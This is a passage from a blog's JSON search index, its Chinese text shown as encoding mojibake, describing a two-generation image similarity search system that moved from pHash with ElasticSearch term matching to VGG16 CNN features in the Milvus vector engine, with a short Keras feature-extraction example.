","date":"2020-06-04","objectID":"/image-search-total/:0:0","tags":["Engineering"],"title":"åˆæ‹å›¾ç‰‡ç®¡å®¶äº¿çº§å›¾åƒä¹‹æœå›¾ç³»ç»Ÿçš„ä¸¤ä»£æ¼”è¿›åŠåº•å±‚åŸç†","uri":"/image-search-total/"},{"categories":["Engineering"],"content":"å‰è¨€ åˆæ‹å›¾ç‰‡ç®¡å®¶å½“å‰æœåŠ¡äº†åƒä¸‡çº§ç”¨æˆ·ï¼Œç®¡ç†äº†ç™¾äº¿çº§å›¾ç‰‡ã€‚å½“ç”¨æˆ·çš„å›¾åº“å˜å¾—è¶Šæ¥è¶Šåºå¤§æ—¶ï¼Œä¸šåŠ¡ä¸Šæ€¥åˆ‡çš„éœ€è¦ä¸€ç§æ–¹æ¡ˆèƒ½å¤Ÿå¿«é€Ÿå®šä½å›¾åƒï¼Œå³ç›´æ¥è¾“å…¥å›¾åƒï¼Œç„¶åæ ¹æ®è¾“å…¥çš„å›¾åƒå†…å®¹æ¥æ‰¾åˆ°å›¾åº“ä¸­çš„åŸå›¾åŠç›¸ä¼¼å›¾ï¼Œè€Œä»¥å›¾æœå›¾æœåŠ¡å°±æ˜¯ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ æœ¬äººäºåœ¨èŒæœŸé—´ç‹¬ç«‹è´Ÿè´£å¹¶å®æ–½äº†æ•´ä¸ªä»¥å›¾æœå›¾ç³»ç»Ÿä»æŠ€æœ¯è°ƒç ”ã€åˆ°è®¾è®¡éªŒè¯ã€ä»¥åŠæœ€åå·¥ç¨‹å®ç°çš„å…¨è¿‡ç¨‹ã€‚è€Œæ•´ä¸ªä»¥å›¾æœå›¾æœåŠ¡ä¹Ÿæ˜¯ç»å†äº†ä¸¤æ¬¡çš„æ•´ä½“æ¼”è¿›ï¼šä» 2019 å¹´åˆå¼€å§‹ç¬¬ä¸€æ¬¡æŠ€æœ¯è°ƒç ”ï¼Œç»å†æ˜¥èŠ‚å‡æœŸï¼Œ2019 å¹´ 3ã€4 æœˆä»½ç¬¬ä¸€ä»£ç³»ç»Ÿæ•´ä½“ä¸Šçº¿ï¼›2020 å¹´åˆç€æ‰‹å‡çº§æ–¹æ¡ˆè°ƒç ”ï¼Œç»å†æ˜¥èŠ‚åŠç–«æƒ…ï¼Œ2020 å¹´ 4 æœˆä»½å¼€å§‹ç¬¬äºŒä»£ç³»ç»Ÿçš„æ•´ä½“å‡çº§ã€‚ æœ¬æ–‡å°†ä¼šç®€è¿°ä¸¤ä»£æœå›¾ç³»ç»ŸèƒŒåçš„æŠ€æœ¯é€‰å‹åŠåŸºæœ¬åŸç†ã€‚ ","date":"2020-06-04","objectID":"/image-search-total/:1:0","tags":["Engineering"],"title":"åˆæ‹å›¾ç‰‡ç®¡å®¶äº¿çº§å›¾åƒä¹‹æœå›¾ç³»ç»Ÿçš„ä¸¤ä»£æ¼”è¿›åŠåº•å±‚åŸç†","uri":"/image-search-total/"},{"categories":["Engineering"],"content":"åŸºç¡€æ¦‚è¦ ","date":"2020-06-04","objectID":"/image-search-total/:2:0","tags":["Engineering"],"title":"åˆæ‹å›¾ç‰‡ç®¡å®¶äº¿çº§å›¾åƒä¹‹æœå›¾ç³»ç»Ÿçš„ä¸¤ä»£æ¼”è¿›åŠåº•å±‚åŸç†","uri":"/image-search-total/"},{"categories":["Engineering"],"content":"å›¾åƒæ˜¯ä»€ä¹ˆï¼Ÿ ä¸å›¾åƒæ‰“äº¤é“ï¼Œæˆ‘ä»¬å¿…é¡»è¦å…ˆçŸ¥é“ï¼šå›¾åƒæ˜¯ä»€ä¹ˆï¼Ÿ ç­”æ¡ˆï¼šåƒç´ ç‚¹çš„é›†åˆã€‚ æ¯”å¦‚ï¼š å·¦å›¾çº¢è‰²åœˆä¸­çš„éƒ¨åˆ†å…¶å®å°±æ˜¯å³å›¾ä¸­ä¸€ç³»åˆ—çš„åƒç´ ç‚¹ã€‚ å†ä¸¾ä¾‹ï¼š å‡è®¾ä¸Šå›¾çº¢è‰²åœˆçš„éƒ¨åˆ†æ˜¯ä¸€å¹…å›¾åƒï¼Œå…¶ä¸­æ¯ä¸€ä¸ªç‹¬ç«‹çš„å°æ–¹æ ¼å°±æ˜¯ä¸€ä¸ªåƒç´ ç‚¹ï¼ˆç®€ç§°åƒç´ ï¼‰ï¼Œåƒç´ æ˜¯æœ€åŸºæœ¬çš„ä¿¡æ¯å•å…ƒï¼Œè€Œè¿™å¹…å›¾åƒçš„å¤§å°å°±æ˜¯ 11 x 11 px ã€‚ ","date":"2020-06-04","objectID":"/image-search-total/:2:1","tags":["Engineering"],"title":"åˆæ‹å›¾ç‰‡ç®¡å®¶äº¿çº§å›¾åƒä¹‹æœå›¾ç³»ç»Ÿçš„ä¸¤ä»£æ¼”è¿›åŠåº•å±‚åŸç†","uri":"/image-search-total/"},{"categories":["Engineering"],"content":"å›¾åƒçš„æ•°å­¦è¡¨ç¤º æ¯ä¸ªå›¾åƒéƒ½å¯ä»¥å¾ˆè‡ªç„¶çš„ç”¨çŸ©é˜µæ¥è¡¨ç¤ºï¼Œæ¯ä¸ªåƒç´ ç‚¹å¯¹åº”çš„å°±æ˜¯çŸ©é˜µä¸­çš„ä¸€ä¸ªå…ƒç´ ã€‚ äºŒå€¼å›¾åƒ äºŒå€¼å›¾åƒçš„åƒç´ ç‚¹åªæœ‰é»‘ç™½ä¸¤ç§æƒ…å†µï¼Œå› æ­¤æ¯ä¸ªåƒç´ ç‚¹å¯ä»¥ç”± 0 å’Œ 1 æ¥è¡¨ç¤ºã€‚ æ¯”å¦‚ä¸€å¼  4 * 4 äºŒå€¼å›¾åƒï¼š 0 1 0 1 1 0 0 0 1 1 1 0 0 0 1 0 RGB å›¾åƒ çº¢ï¼ˆRedï¼‰ã€ç»¿ï¼ˆGreenï¼‰ã€è“ï¼ˆBlueï¼‰ä½œä¸ºä¸‰åŸè‰²å¯ä»¥è°ƒå’Œæˆä»»æ„çš„é¢œè‰²ï¼Œå¯¹äº RGB å›¾åƒï¼Œæ¯ä¸ªåƒç´ ç‚¹åŒ…å« RGB å…±ä¸‰ä¸ªé€šé“çš„åŸºæœ¬ä¿¡æ¯ï¼Œç±»ä¼¼çš„ï¼Œå¦‚æœæ¯ä¸ªé€šé“ç”¨ 8 bit è¡¨ç¤ºå³ 256 çº§ç°åº¦ï¼Œé‚£ä¹ˆä¸€ä¸ªåƒç´ ç‚¹å¯ä»¥è¡¨ç¤ºä¸ºï¼š ( [0 ... 255], [0 ... 255], [0 ... 255] ) æ¯”å¦‚ä¸€å¼  4 * 4 RGB å›¾åƒï¼š (156, 22, 45) (255, 0, 0) (0, 156, 32) (14, 2, 90) (12, 251, 88) (78, 12, 3) (94, 90, 87) (134, 0, 2) (240, 33, 44) (5, 66, 77) (1, 28, 167) (11, 11, 11) (0, 0, 0) (4, 4, 4) (50, 50, 50) (100, 10, 10) å›¾åƒå¤„ç†çš„æœ¬è´¨å®é™…ä¸Šå°±æ˜¯å¯¹è¿™äº›åƒç´ çŸ©é˜µè¿›è¡Œè®¡ç®—ã€‚ ","date":"2020-06-04","objectID":"/image-search-total/:2:2","tags":["Engineering"],"title":"åˆæ‹å›¾ç‰‡ç®¡å®¶äº¿çº§å›¾åƒä¹‹æœå›¾ç³»ç»Ÿçš„ä¸¤ä»£æ¼”è¿›åŠåº•å±‚åŸç†","uri":"/image-search-total/"},{"categories":["Engineering"],"content":"æœå›¾çš„æŠ€æœ¯é—®é¢˜ å¦‚æœåªæ˜¯æ‰¾åŸå›¾ï¼Œä¹Ÿå°±æ˜¯åƒç´ ç‚¹å®Œå…¨ç›¸åŒçš„å›¾åƒï¼Œé‚£ä¹ˆç›´æ¥å¯¹æ¯”å®ƒä»¬çš„ MD5 å€¼å³å¯ã€‚ç„¶è€Œï¼Œå›¾åƒåœ¨ç½‘ç»œçš„ä¼ è¾“è¿‡ç¨‹ä¸­ï¼Œå¸¸å¸¸ä¼šé‡åˆ°è¯¸å¦‚å‹ç¼©ã€æ°´å°ç­‰ç­‰æƒ…å†µï¼Œè€Œ MD5 ç®—æ³•çš„ç‰¹ç‚¹æ˜¯ï¼Œå³ä½¿æ˜¯å°éƒ¨åˆ†å†…å®¹å˜åŠ¨ï¼Œå…¶æœ€ç»ˆçš„ç»“æœå´æ˜¯å¤©å·®åœ°åˆ«ï¼Œæ¢å¥è¯è¯´åªè¦å›¾ç‰‡æœ‰ä¸€ä¸ªåƒç´ ç‚¹ä¸ä¸€è‡´ï¼Œæœ€åéƒ½æ˜¯æ— æ³•å¯¹æ¯”çš„ã€‚ å¯¹äºä¸€ä¸ªä»¥å›¾æœå›¾ç³»ç»Ÿè€Œè¨€ï¼Œæˆ‘ä»¬è¦æœçš„æœ¬è´¨ä¸Šå…¶å®æ˜¯å†…å®¹ç›¸ä¼¼çš„å›¾ç‰‡ï¼Œä¸ºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦è§£å†³ä¸¤ä¸ªåŸºæœ¬çš„é—®é¢˜ï¼š æŠŠå›¾åƒè¡¨ç¤ºæˆ–æŠ½è±¡ä¸ºä¸€ä¸ªè®¡ç®—æœºæ•°æ® è¿™ä¸ªæ•°æ®å¿…é¡»æ˜¯å¯ä»¥è¿›è¡Œå¯¹æ¯”è®¡ç®—çš„ ç›´æ¥ç”¨ä¸“ä¸šç‚¹çš„è¯è¯´å°±æ˜¯ï¼š å›¾åƒçš„ç‰¹å¾æå– ç‰¹å¾è®¡ç®—ï¼ˆç›¸ä¼¼æ€§è®¡ç®—ï¼‰ ","date":"2020-06-04","objectID":"/image-search-total/:2:3","tags":["Engineering"],"title":"åˆæ‹å›¾ç‰‡ç®¡å®¶äº¿çº§å›¾åƒä¹‹æœå›¾ç³»ç»Ÿçš„ä¸¤ä»£æ¼”è¿›åŠåº•å±‚åŸç†","uri":"/image-search-total/"},{"categories":["Engineering"],"content":"ç¬¬ä¸€ä»£æœå›¾ç³»ç»Ÿ ","date":"2020-06-04","objectID":"/image-search-total/:3:0","tags":["Engineering"],"title":"åˆæ‹å›¾ç‰‡ç®¡å®¶äº¿çº§å›¾åƒä¹‹æœå›¾ç³»ç»Ÿçš„ä¸¤ä»£æ¼”è¿›åŠåº•å±‚åŸç†","uri":"/image-search-total/"},{"categories":["Engineering"],"content":"ç‰¹æ€§æå– - å›¾åƒæŠ½è±¡ ç¬¬ä¸€ä»£æœå›¾ç³»ç»Ÿåœ¨ç‰¹å¾æå–ä¸Šä½¿ç”¨çš„æ˜¯ Perceptual hash å³ pHash ç®—æ³•ï¼Œè¿™ä¸ªç®—æ³•çš„åŸºæœ¬åŸç†æ˜¯ä»€ä¹ˆï¼Ÿ å¦‚ä¸Šå›¾æ‰€ç¤ºï¼ŒpHash ç®—æ³•å°±æ˜¯å¯¹å›¾åƒæ•´ä½“è¿›è¡Œä¸€ç³»åˆ—å˜æ¢æœ€åæ„é€  hash å€¼ï¼Œè€Œå˜æ¢çš„è¿‡ç¨‹å¯ä»¥ç†è§£ä¸ºå¯¹å›¾åƒè¿›è¡Œä¸æ–­çš„æŠ½è±¡ï¼Œæ­¤æ—¶å¦‚æœå¯¹å¦å¤–ä¸€å¼ ç›¸ä¼¼å†…å®¹çš„å›¾åƒè¿›è¡ŒåŒæ ·çš„æ•´ä½“æŠ½è±¡ï¼Œé‚£ä¹ˆå…¶ç»“æœä¸€å®šæ˜¯éå¸¸æ¥è¿‘çš„ã€‚ ","date":"2020-06-04","objectID":"/image-search-total/:3:1","tags":["Engineering"],"title":"åˆæ‹å›¾ç‰‡ç®¡å®¶äº¿çº§å›¾åƒä¹‹æœå›¾ç³»ç»Ÿçš„ä¸¤ä»£æ¼”è¿›åŠåº•å±‚åŸç†","uri":"/image-search-total/"},{"categories":["Engineering"],"content":"ç‰¹æ€§è®¡ç®— - ç›¸ä¼¼æ€§è®¡ç®— å¯¹äºä¸¤å¼ å›¾åƒçš„ pHash å€¼ï¼Œå…·ä½“å¦‚ä½•è®¡ç®—å…¶ç›¸ä¼¼çš„ç¨‹åº¦ï¼Ÿç­”æ¡ˆæ˜¯ Hamming distance æ±‰æ˜è·ç¦»ï¼Œæ±‰æ˜è·ç¦»è¶Šå°ï¼Œå›¾åƒå†…å®¹è¶Šç›¸ä¼¼ã€‚ æ±‰æ˜è·ç¦»åˆæ˜¯ä»€ä¹ˆï¼Ÿå°±æ˜¯å¯¹åº”ä½ç½®ä¸åŒæ¯”ç‰¹ä½çš„ä¸ªæ•°ã€‚ ä¾‹å¦‚ï¼š ç¬¬ä¸€ä¸ªå€¼ï¼š 0 1 0 1 0 ç¬¬äºŒä¸ªå€¼ï¼š 0 0 0 1 1 ä»¥ä¸Šä¸¤ä¸ªå€¼çš„å¯¹åº”ä½ç½®ä¸Šæœ‰ 2 ä¸ªæ¯”ç‰¹ä½æ˜¯ä¸ç›¸åŒçš„ï¼Œå› æ­¤å®ƒä»¬çš„æ±‰æ˜è·ç¦»å°±æ˜¯ 2 ã€‚ OK ï¼Œç›¸ä¼¼æ€§è®¡ç®—çš„åŸç†æˆ‘ä»¬çŸ¥é“äº†ï¼Œé‚£ä¹ˆä¸‹ä¸€ä¸ªé—®é¢˜æ˜¯ï¼šå¦‚ä½•å»è®¡ç®—äº¿çº§å›¾ç‰‡å¯¹åº”çš„äº¿çº§æ•°æ®çš„æ±‰æ˜è·ç¦»ï¼Ÿç®€è€Œè¨€ä¹‹ï¼Œå°±æ˜¯å¦‚ä½•æœç´¢ï¼Ÿ åœ¨é¡¹ç›®æ—©æœŸå…¶å®æˆ‘å¹¶æ²¡æœ‰æ‰¾åˆ°ä¸€ä¸ªæ»¡æ„çš„èƒ½å¤Ÿå¿«é€Ÿè®¡ç®—æ±‰æ˜è·ç¦»çš„å·¥å…·ï¼ˆæˆ–è€…è¯´æ˜¯è®¡ç®—å¼•æ“ï¼‰ï¼Œå› æ­¤æˆ‘çš„æ–¹æ¡ˆè¿›è¡Œäº†ä¸€æ¬¡å˜é€šã€‚ å˜é€šçš„æ€æƒ³æ˜¯ï¼šå¦‚æœä¸¤ä¸ª pHash å€¼çš„æ±‰æ˜è·ç¦»æ˜¯æ¥è¿‘çš„ï¼Œé‚£ä¹ˆå°† pHash å€¼è¿›è¡Œåˆ‡å‰²åï¼Œåˆ‡å‰²åçš„æ¯ä¸€ä¸ªå°éƒ¨åˆ†å¤§æ¦‚ç‡ç›¸ç­‰ã€‚ ä¾‹å¦‚ï¼š ç¬¬ä¸€ä¸ªå€¼ï¼š 8 a 0 3 0 3 f 6 ç¬¬äºŒä¸ªå€¼ï¼š 8 a 0 3 0 3 d 8 æˆ‘ä»¬æŠŠä¸Šé¢è¿™ä¸¤ä¸ªå€¼åˆ†å‰²æˆäº† 8 å—ï¼Œå…¶ä¸­ 6 å—çš„å€¼æ˜¯å®Œå…¨ç›¸åŒçš„ï¼Œå› æ­¤å¯ä»¥æ¨æ–­å®ƒä»¬çš„æ±‰æ˜è·ç¦»æ¥è¿‘ï¼Œä»è€Œå›¾åƒå†…å®¹ä¹Ÿç›¸ä¼¼ã€‚ ç»è¿‡å˜æ¢ä¹‹åï¼Œå…¶å®ä½ å¯ä»¥å‘ç°ï¼Œæ±‰æ˜è·ç¦»çš„è®¡ç®—é—®é¢˜ï¼Œå˜æˆäº†ç­‰å€¼åŒ¹é…çš„é—®é¢˜ï¼Œæˆ‘æŠŠæ¯ä¸€ä¸ª pHash å€¼ç»™åˆ†æˆäº† 8 æ®µï¼Œåªè¦é‡Œé¢æœ‰è¶…è¿‡ 5 æ®µçš„å€¼æ˜¯å®Œå…¨ç›¸åŒçš„ï¼Œé‚£ä¹ˆæˆ‘å°±è®¤ä¸ºä»–ä»¬ç›¸ä¼¼ã€‚ ç­‰å€¼åŒ¹é…å¦‚ä½•è§£å†³ï¼Ÿè¿™å°±å¾ˆç®€å•äº†ï¼Œä¼ ç»Ÿæ•°æ®åº“çš„æ¡ä»¶è¿‡æ»¤ä¸å°±å¯ä»¥ç”¨äº†å˜›ã€‚ å½“ç„¶ï¼Œæˆ‘è¿™é‡Œç”¨çš„æ˜¯ ElasticSearchï¼ˆ ES çš„åŸç†æœ¬æ–‡å°±ä¸ä»‹ç»äº†ï¼Œè¯»è€…å¯ä»¥å¦è¡Œäº†è§£ï¼‰ï¼Œåœ¨ ES é‡Œçš„å…·ä½“æ“ä½œå°±æ˜¯å¤š term åŒ¹é…ç„¶å minimum_should_match æŒ‡å®šåŒ¹é…ç¨‹åº¦ã€‚ ä¸ºä»€ä¹ˆæœç´¢ä¼šé€‰æ‹© ElasticSearch ï¼Ÿç¬¬ä¸€ç‚¹ï¼Œå®ƒèƒ½å®ç°ä¸Šè¿°çš„æœç´¢åŠŸèƒ½ï¼›ç¬¬äºŒç‚¹ï¼Œå›¾ç‰‡ç®¡å®¶é¡¹ç›®æœ¬èº«å°±æ­£åœ¨ç”¨ ES æä¾›å…¨æ–‡æœç´¢çš„åŠŸèƒ½ï¼Œä½¿ç”¨ç°æœ‰èµ„æºï¼Œæˆæœ¬æ˜¯éå¸¸ä½çš„ã€‚ ","date":"2020-06-04","objectID":"/image-search-total/:3:2","tags":["Engineering"],"title":"åˆæ‹å›¾ç‰‡ç®¡å®¶äº¿çº§å›¾åƒä¹‹æœå›¾ç³»ç»Ÿçš„ä¸¤ä»£æ¼”è¿›åŠåº•å±‚åŸç†","uri":"/image-search-total/"},{"categories":["Engineering"],"content":"ç¬¬ä¸€ä»£ç³»ç»Ÿæ€»ç»“ ç¬¬ä¸€ä»£æœå›¾ç³»ç»Ÿåœ¨æŠ€æœ¯ä¸Šé€‰æ‹©äº† pHash + ElasticSearch çš„æ–¹æ¡ˆï¼Œå®ƒæ‹¥æœ‰å¦‚ä¸‹ç‰¹ç‚¹ï¼š pHash ç®—æ³•è®¡ç®—ç®€å•ï¼Œå¯ä»¥å¯¹æŠ—ä¸€å®šç¨‹åº¦çš„å‹ç¼©ã€æ°´å°ã€å™ªå£°ç­‰å½±å“ã€‚ ElasticSearch ç›´æ¥ä½¿ç”¨äº†é¡¹ç›®ç°æœ‰èµ„æºï¼Œåœ¨æœç´¢ä¸Šæ²¡æœ‰å¢åŠ é¢å¤–çš„æˆæœ¬ã€‚ å½“ç„¶è¿™å¥—ç³»ç»Ÿçš„å±€é™æ€§ä¹Ÿå¾ˆæ˜æ˜¾ï¼šç”±äº pHash ç®—æ³•æ˜¯å¯¹å›¾åƒçš„æ•´ä½“è¿›è¡ŒæŠ½è±¡è¡¨ç¤ºï¼Œä¸€æ—¦æˆ‘ä»¬å¯¹æ•´ä½“æ€§è¿›è¡Œäº†ç ´åï¼Œæ¯”å¦‚åœ¨åŸå›¾åŠ ä¸€ä¸ªé»‘è¾¹ï¼Œå°±ä¼šå‡ ä¹æ— æ³•åˆ¤æ–­ç›¸ä¼¼æ€§ã€‚ ä¸ºäº†çªç ´è¿™ä¸ªå±€é™æ€§ï¼Œåº•å±‚æŠ€æœ¯æˆªç„¶ä¸åŒçš„ç¬¬äºŒä»£æœå›¾ç³»ç»Ÿåº”è¿è€Œç”Ÿã€‚ ","date":"2020-06-04","objectID":"/image-search-total/:3:3","tags":["Engineering"],"title":"åˆæ‹å›¾ç‰‡ç®¡å®¶äº¿çº§å›¾åƒä¹‹æœå›¾ç³»ç»Ÿçš„ä¸¤ä»£æ¼”è¿›åŠåº•å±‚åŸç†","uri":"/image-search-total/"},{"categories":["Engineering"],"content":"ç¬¬äºŒä»£æœå›¾ç³»ç»Ÿ ","date":"2020-06-04","objectID":"/image-search-total/:4:0","tags":["Engineering"],"title":"åˆæ‹å›¾ç‰‡ç®¡å®¶äº¿çº§å›¾åƒä¹‹æœå›¾ç³»ç»Ÿçš„ä¸¤ä»£æ¼”è¿›åŠåº•å±‚åŸç†","uri":"/image-search-total/"},{"categories":["Engineering"],"content":"ç‰¹æ€§æå– åœ¨è®¡ç®—æœºè§†è§‰é¢†åŸŸï¼Œä½¿ç”¨äººå·¥æ™ºèƒ½ç›¸å…³çš„æŠ€æœ¯åŸºæœ¬ä¸Šå·²ç»æˆäº†ä¸»æµï¼ŒåŒæ ·ï¼Œæˆ‘ä»¬ç¬¬äºŒä»£æœå›¾ç³»ç»Ÿçš„ç‰¹å¾æå–åœ¨åº•å±‚æŠ€æœ¯ä¸Šä½¿ç”¨çš„æ˜¯ CNN å·ç§¯ç¥ç»ç½‘ç»œã€‚ CNN å·ç§¯ç¥ç»ç½‘ç»œè¿™ä¸ªè¯è®©äººæ¯”è¾ƒéš¾ä»¥ç†è§£ï¼Œé‡ç‚¹æ˜¯å›ç­”ä¸¤ä¸ªé—®é¢˜ï¼š CNN èƒ½å¹²ä»€ä¹ˆï¼Ÿ æœå›¾ä¸ºä»€ä¹ˆèƒ½ç”¨ CNN ? AI é¢†åŸŸæœ‰å¾ˆå¤šèµ›äº‹ï¼Œå›¾åƒåˆ†ç±»æ˜¯å…¶ä¸­ä¸€é¡¹é‡è¦çš„æ¯”èµ›å†…å®¹ï¼Œè€Œå›¾åƒåˆ†ç±»å°±æ˜¯è¦å»åˆ¤æ–­å›¾ç‰‡çš„å†…å®¹åˆ°åº•æ˜¯çŒ«ã€æ˜¯ç‹—ã€æ˜¯è‹¹æœã€æ˜¯æ¢¨å­ã€è¿˜æ˜¯å…¶å®ƒå¯¹è±¡ç±»åˆ«ã€‚ CNN èƒ½å¹²ä»€ä¹ˆï¼Ÿæå–ç‰¹å¾ï¼Œè¿›è€Œè¯†ç‰©ï¼Œæˆ‘æŠŠè¿™ä¸ªè¿‡ç¨‹ç®€å•çš„ç†è§£ä¸ºï¼Œä»å¤šä¸ªä¸åŒçš„ç»´åº¦å»æå–ç‰¹å¾ï¼Œè¡¡é‡ä¸€å¼ å›¾ç‰‡çš„å†…å®¹æˆ–è€…ç‰¹å¾ä¸çŒ«çš„ç‰¹å¾æœ‰å¤šæ¥è¿‘ï¼Œä¸ç‹—çš„ç‰¹å¾æœ‰å¤šæ¥è¿‘ï¼Œç­‰ç­‰ç­‰ç­‰ï¼Œé€‰æ‹©æœ€æ¥è¿‘çš„å°±å¯ä»¥ä½œä¸ºæˆ‘ä»¬çš„è¯†åˆ«ç»“æœï¼Œä¹Ÿå°±æ˜¯åˆ¤æ–­è¿™å¼ å›¾ç‰‡çš„å†…å®¹æ˜¯çŒ«ï¼Œè¿˜æ˜¯ç‹—ï¼Œè¿˜æ˜¯å…¶å®ƒã€‚ CNN è¯†ç‰©åˆè·Ÿæˆ‘ä»¬æ‰¾ç›¸ä¼¼çš„å›¾åƒæœ‰ä»€ä¹ˆå…³ç³»ï¼Ÿæˆ‘ä»¬è¦çš„ä¸æ˜¯æœ€ç»ˆçš„è¯†ç‰©ç»“æœï¼Œè€Œæ˜¯ä»å¤šä¸ªç»´åº¦æå–å‡ºæ¥çš„ç‰¹å¾å‘é‡ï¼Œä¸¤å¼ å†…å®¹ç›¸ä¼¼çš„å›¾åƒçš„ç‰¹å¾å‘é‡ä¸€å®šæ˜¯æ¥è¿‘çš„ã€‚ å…·ä½“ä½¿ç”¨å“ªç§ CNN æ¨¡å‹ï¼Ÿ æˆ‘ä½¿ç”¨çš„æ˜¯ VGG16 ï¼Œä¸ºä»€ä¹ˆé€‰æ‹©å®ƒï¼Ÿé¦–å…ˆï¼ŒVGG16 æ‹¥æœ‰å¾ˆå¥½çš„æ³›åŒ–èƒ½åŠ›ï¼Œä¹Ÿå°±æ˜¯å¾ˆé€šç”¨ï¼›å…¶æ¬¡ï¼ŒVGG16 æå–å‡ºæ¥çš„ç‰¹å¾å‘é‡æ˜¯ 512 ç»´ï¼Œç»´åº¦é€‚ä¸­ï¼Œå¦‚æœç»´åº¦å¤ªå°‘ï¼Œç²¾åº¦å¯èƒ½ä¼šå—å½±å“ï¼Œå¦‚æœç»´åº¦å¤ªå¤šï¼Œå­˜å‚¨å’Œè®¡ç®—è¿™äº›ç‰¹å¾å‘é‡çš„æˆæœ¬ä¼šæ¯”è¾ƒé«˜ã€‚ ","date":"2020-06-04","objectID":"/image-search-total/:4:1","tags":["Engineering"],"title":"åˆæ‹å›¾ç‰‡ç®¡å®¶äº¿çº§å›¾åƒä¹‹æœå›¾ç³»ç»Ÿçš„ä¸¤ä»£æ¼”è¿›åŠåº•å±‚åŸç†","uri":"/image-search-total/"},{"categories":["Engineering"],"content":"å‘é‡æœç´¢å¼•æ“ ä»å›¾åƒæå–ç‰¹å¾å‘é‡çš„é—®é¢˜å·²ç»è§£å†³äº†ï¼Œé‚£ä¹ˆå‰©ä¸‹çš„é—®é¢˜å°±æ˜¯ï¼š ç‰¹å¾å‘é‡å¦‚ä½•å­˜å‚¨ï¼Ÿ ç‰¹å¾å‘é‡å¦‚ä½•è®¡ç®—ç›¸ä¼¼æ€§ï¼Œå³å¦‚ä½•æœç´¢ï¼Ÿ å¯¹äºè¿™ä¸¤ä¸ªé—®é¢˜ï¼Œç›´æ¥ä½¿ç”¨å¼€æºçš„å‘é‡æœç´¢å¼•æ“ Milvus å°±å¯ä»¥å¾ˆå¥½çš„è§£å†³ï¼Œæˆªè‡³ç›®å‰ï¼ŒMilvus åœ¨æˆ‘ä»¬çš„ç”Ÿäº§ç¯å¢ƒä¸€ç›´è¿è¡Œè‰¯å¥½ã€‚ ","date":"2020-06-04","objectID":"/image-search-total/:4:2","tags":["Engineering"],"title":"åˆæ‹å›¾ç‰‡ç®¡å®¶äº¿çº§å›¾åƒä¹‹æœå›¾ç³»ç»Ÿçš„ä¸¤ä»£æ¼”è¿›åŠåº•å±‚åŸç†","uri":"/image-search-total/"},{"categories":["Engineering"],"content":"ç¬¬äºŒä»£ç³»ç»Ÿæ€»ç»“ ç¬¬äºŒä»£æœå›¾ç³»ç»Ÿåœ¨æŠ€æœ¯ä¸Šé€‰æ‹©äº† CNN + Milvus çš„æ–¹æ¡ˆï¼Œè€Œè¿™ç§åŸºäºç‰¹å¾å‘é‡çš„æœç´¢åœ¨ä¸šåŠ¡ä¸Šä¹Ÿæä¾›äº†æ›´å¥½çš„æ”¯æŒã€‚ ","date":"2020-06-04","objectID":"/image-search-total/:4:3","tags":["Engineering"],"title":"åˆæ‹å›¾ç‰‡ç®¡å®¶äº¿çº§å›¾åƒä¹‹æœå›¾ç³»ç»Ÿçš„ä¸¤ä»£æ¼”è¿›åŠåº•å±‚åŸç†","uri":"/image-search-total/"},{"categories":["Engineering"],"content":"ç›¸å…³æ–‡ç«  æœ¬äººä¹‹å‰å·²ç»å†™è¿‡ä¸¤ç¯‡ç›¸å…³çš„æ–‡ç« ï¼š ä»¥å›¾æœå›¾ç³»ç»Ÿæ¦‚è¿° ä»¥å›¾æœå›¾ç³»ç»Ÿå·¥ç¨‹å®è·µ è‹±æ–‡ç‰ˆï¼š The Journey to Optimizing Billion-scale Image Similarity Search (1/2) The Journey to Optimizing Billion-scale Image Similarity Search (2/2) ","date":"2020-06-04","objectID":"/image-search-total/:5:0","tags":["Engineering"],"title":"åˆæ‹å›¾ç‰‡ç®¡å®¶äº¿çº§å›¾åƒä¹‹æœå›¾ç³»ç»Ÿçš„ä¸¤ä»£æ¼”è¿›åŠåº•å±‚åŸç†","uri":"/image-search-total/"},{"categories":["Engineering"],"content":"ä»¥å›¾æœå›¾ç³»ç»Ÿå·¥ç¨‹å®è·µ","date":"2020-04-11","objectID":"/image-search-system2/","tags":["Engineering"],"title":"ä»¥å›¾æœå›¾ç³»ç»Ÿå·¥ç¨‹å®è·µ","uri":"/image-search-system2/"},{"categories":["Engineering"],"content":"ä»¥å›¾æœå›¾ç³»ç»Ÿå·¥ç¨‹å®è·µ ä¹‹å‰å†™è¿‡ä¸€ç¯‡æ¦‚è¿°: ä»¥å›¾æœå›¾ç³»ç»Ÿæ¦‚è¿° ã€‚ ä»¥å›¾æœå›¾ç³»ç»Ÿéœ€è¦è§£å†³çš„ä¸»è¦é—®é¢˜æ˜¯ï¼š æå–å›¾åƒç‰¹å¾å‘é‡ï¼ˆç”¨ç‰¹å¾å‘é‡å»è¡¨ç¤ºä¸€å¹…å›¾åƒï¼‰ ç‰¹å¾å‘é‡çš„ç›¸ä¼¼åº¦è®¡ç®—ï¼ˆå¯»æ‰¾å†…å®¹ç›¸ä¼¼çš„å›¾åƒï¼‰ å¯¹åº”çš„å·¥ç¨‹å®è·µï¼Œå…·ä½“ä¸ºï¼š å·ç§¯ç¥ç»ç½‘ç»œ CNN æå–å›¾åƒç‰¹å¾ å‘é‡æœç´¢å¼•æ“ Milvus ","date":"2020-04-11","objectID":"/image-search-system2/:0:0","tags":["Engineering"],"title":"ä»¥å›¾æœå›¾ç³»ç»Ÿå·¥ç¨‹å®è·µ","uri":"/image-search-system2/"},{"categories":["Engineering"],"content":"CNN ä½¿ç”¨å·ç§¯ç¥ç»ç½‘è·¯ CNN å»æå–å›¾åƒç‰¹å¾æ˜¯ä¸€ç§ä¸»æµçš„æ–¹æ¡ˆï¼Œå…·ä½“çš„æ¨¡å‹åˆ™å¯ä»¥ä½¿ç”¨ VGG16 ï¼ŒæŠ€æœ¯å®ç°ä¸Šåˆ™ä½¿ç”¨ Keras + TensorFlow ï¼Œå‚è€ƒ Keras å®˜æ–¹ç¤ºä¾‹ï¼š from keras.applications.vgg16 import VGG16 from keras.preprocessing import image from keras.applications.vgg16 import preprocess_input import numpy as np model = VGG16(weights='imagenet', include_top=False) img_path = 'elephant.jpg' img = image.load_img(img_path, target_size=(224, 224)) x = image.img_to_array(img) x = np.expand_dims(x, axis=0) x = preprocess_input(x) features = model.predict(x) è¿™é‡Œæå–å‡ºæ¥çš„ feature å°±æ˜¯ç‰¹æ€§å‘é‡ã€‚ 